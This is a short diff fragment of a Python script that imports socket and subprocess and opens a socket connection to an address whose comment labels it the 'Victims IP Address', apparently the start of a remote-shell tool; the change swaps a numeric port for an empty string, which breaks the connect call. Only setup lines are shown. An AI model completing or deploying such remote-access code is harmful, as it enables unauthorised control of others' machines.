@@ -3,7 +3,7 @@ import socket
 import subprocess
 
 SERVER_IP = ' '  # Victims IP Address
-PORT = 10001     #Put A open port
+PORT = " "    #Put A open port
 
 s = socket.socket()
 s.connect((SERVER_IP, PORT))
